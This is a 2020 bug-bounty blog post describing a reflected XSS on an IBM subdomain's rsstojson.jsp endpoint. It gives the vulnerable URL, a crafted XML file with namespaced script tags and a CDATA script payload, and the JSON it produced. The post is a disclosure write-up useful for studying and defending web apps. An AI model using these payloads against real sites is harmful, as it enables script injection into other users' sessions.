<!doctype html><html><head><title>[IBM] XSS Reflected via xml files - Khaled Nassar</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="Khaled Nassar"><link rel="shortcut icon" type=image/x-icon href=https://blog.knas.me/img/favicon.ico><link rel=stylesheet href=https://blog.knas.me/style.min.39acacc5d2051426f655a6b7fbf4786fbd0fd8fffd09322c9b497ef0f7439b3f.css integrity="sha256-OaysxdIFFCb2Vaa3+/R4b70P2P/9CTIsm0l+8PdDmz8="><link rel=stylesheet href=https://blog.knas.me/style-dark.min.0a647fb6c07e04b77b54fa0515d0a683d39ecdb251dba960fe1f966f7ff36fc2.css media="(prefers-color-scheme: dark)" integrity="sha256-CmR/tsB+BLd7VPoFFdCmg9OezbJR26lg/h+Wb3/zb8I="><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.15.1/css/all.css><meta property="og:title" content=" [IBM] XSS Reflected via xml files"><meta property="og:description" content="simple writeup about XSS Reflected on ibm subdomain"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.knas.me/blog/ibm_xss/"><meta property="article:section" content="blog"><meta property="article:published_time" content="2020-10-26T17:55:28+08:00"><meta property="article:modified_time" content="2020-10-26T17:55:28+08:00"><meta itemprop=name content=" [IBM] XSS Reflected via xml files"><meta itemprop=description content="simple writeup about XSS Reflected on ibm subdomain"><meta itemprop=datePublished content="2020-10-26T17:55:28+08:00"><meta itemprop=dateModified content="2020-10-26T17:55:28+08:00"><meta itemprop=wordCount content="246"><meta itemprop=keywords content="bugbounty,security,webpentesting,"><meta name=twitter:card content="summary"><meta name=twitter:image content="https://blog.knas.me/img/avatar.jpg"><meta name=twitter:title content=" [IBM] XSS Reflected via xml files"><meta name=twitter:description content="simple writeup about XSS Reflected on ibm subdomain"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><h1>[IBM] XSS Reflected via xml files</h1><header><div class=avatar><img class=avatarMask src=https://blog.knas.me/img/avatar.jpg alt>
<a href=https://blog.knas.me><img class=avatar-border src=https://blog.knas.me/img/avatar-border.svg alt></a></div><h2><a class=author href=https://blog.knas.me>Khaled Nassar</a></h2></header><p class=date>October 26, 2020</p><div id=tags><ul><li><a href=https://blog.knas.me/tags/bugbounty/>bugbounty</a></li><li><a href=https://blog.knas.me/tags/security/>security</a></li><li><a href=https://blog.knas.me/tags/webpentesting/>webpentesting</a></li></ul></div><div id=contentBody><p>Hello World :wave:
while I&rsquo;m doing some bug hunting on IBM subdomains I decided instead of using subdomain enumeration I can get interesting endpoints and parameters from <code>waybackurls</code> to shorten the time, after reading the URLs from waybackurls I noticed a lot of endpoints that contain some URLs of XML files in <code>rssurl</code> parameter</p><pre tabindex=0><code>https://www-356.ibm.com/partnerworld/wps/servlet/pwdyn/pw/rss/rsstojson.jsp?ccdb=no&amp;rssurl=https://www-2000.ibm.com/file.xml&amp;_=1596170198353
</code></pre><p><img src=https://1.bp.blogspot.com/-7Dz0qMUTtE0/X5bYy8O2QfI/AAAAAAAAEYw/gioHZXy_lps0DyITLNrJhQFlaCXmV-GHwCLcBGAsYHQ/s1600/Screenshot_at_2020-08-09_18-52-24.png alt=ibm_xml></p><p>all this API endpoint do is read the XML from the URL and then return its value of it but in JSON, for the first time I thought there was an SSRF but after a lot of trying to bypass it, it doesn&rsquo;t work at all</p><p><img src=https://media.tenor.com/RTdXxzgoQewAAAAC/chihuahua-basal.gif alt=noway></p><p>but from another side, I noticed that the response <code>Content-type</code> is <code>text/HTML</code> so I think I can do an xss here, the idea is I can make an XML file that contains the xss payload in one of the variables so after converting it to JSON it will be reflected in the page as an HTML code, like this <code>{"data": "&lt;script>alert(123)&lt;/script>"}</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-XML data-lang=XML><span style=display:flex><span><span style=color:#f92672>&lt;html&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;head&gt;&lt;/head&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;body&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;something:script</span> <span style=color:#a6e22e>xmlns:something=</span><span style=color:#e6db74>&#34;http://www.w3.org/1999/xhtml&#34;</span><span style=color:#f92672>&gt;</span>alert(1)<span style=color:#f92672>&lt;/something:script&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;a:script</span> <span style=color:#a6e22e>xmlns:a=</span><span style=color:#e6db74>&#34;http://www.w3.org/1999/xhtml&#34;</span><span style=color:#f92672>&gt;</span>alert(2)<span style=color:#f92672>&lt;/a:script&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;info&gt;</span>
</span></span><span style=display:flex><span>		  <span style=color:#f92672>&lt;name&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;value&gt;</span><span style=color:#75715e>&lt;![CDATA[&lt;script&gt;confirm(document.domain)&lt;/script&gt;]]&gt;</span><span style=color:#f92672>&lt;/value&gt;</span>
</span></span><span style=display:flex><span>		  <span style=color:#f92672>&lt;/name&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;description&gt;</span>
</span></span><span style=display:flex><span>		      <span style=color:#f92672>&lt;value&gt;</span>Hello<span style=color:#f92672>&lt;/value&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;/description&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;url&gt;</span>
</span></span><span style=display:flex><span>		      <span style=color:#f92672>&lt;value&gt;</span>http://google.com<span style=color:#f92672>&lt;/value&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;/url&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;/info&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;/body&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/html&gt;</span>
</span></span></code></pre></div><p>then upload the file to my site and pass the URL to the rssurl parameter</p><p>the file should be converted like this</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-JSON data-lang=JSON><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;html&#34;</span>: {
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;head&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;body&#34;</span>: {
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;script&#34;</span>: [
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;alert(1)&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;alert(2)&#34;</span>
</span></span><span style=display:flex><span>      ],
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;info&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;name&#34;</span>: {
</span></span><span style=display:flex><span>          <span style=color:#f92672>&#34;value&#34;</span>: {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;__cdata&#34;</span>: <span style=color:#e6db74>&#34;&lt;script&gt;confirm(document.domain)&lt;/script&gt;&#34;</span>
</span></span><span style=display:flex><span>          }
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;description&#34;</span>: {
</span></span><span style=display:flex><span>          <span style=color:#f92672>&#34;value&#34;</span>: <span style=color:#e6db74>&#34;Hello&#34;</span>
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;url&#34;</span>: {
</span></span><span style=display:flex><span>          <span style=color:#f92672>&#34;value&#34;</span>: <span style=color:#e6db74>&#34;http://google.com&#34;</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>and boom</p><p><img src=https://1.bp.blogspot.com/-BHQh_JQb0Uc/X5bZv80_nnI/AAAAAAAAEY8/hn-Ok2MGjcca4ixkIZpeUgQ1kqCYH5OvwCLcBGAsYHQ/s1600/Screenshot_at_2020-08-09_18-54-51.png alt=xss_boom></p><p>see ya :crossed_fingers: :heart:</p></div><footer><p>&copy; 2019 Khaled Nassar.
Powered by <a href=https://gohugo.io/>Hugo</a>
using the <a href=https://github.com/koirand/pulp/>pulp</a> theme.</p></footer></body></html>